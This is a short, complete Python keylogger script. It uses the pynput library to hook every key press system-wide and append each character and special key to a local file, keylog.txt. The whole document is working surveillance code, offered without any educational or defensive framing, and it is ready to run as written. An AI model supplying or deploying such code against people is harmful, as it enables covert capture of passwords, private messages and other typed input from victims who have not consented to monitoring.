from pynput.keyboard import Listener

# File to save the logs
log_file = "keylog.txt"

def log_keystroke(key):
    try:
        # Write the key pressed to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Enter, Space)
        with open(log_file, "a") as f:
            f.write(f"{key}")

def start_keylogger():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()

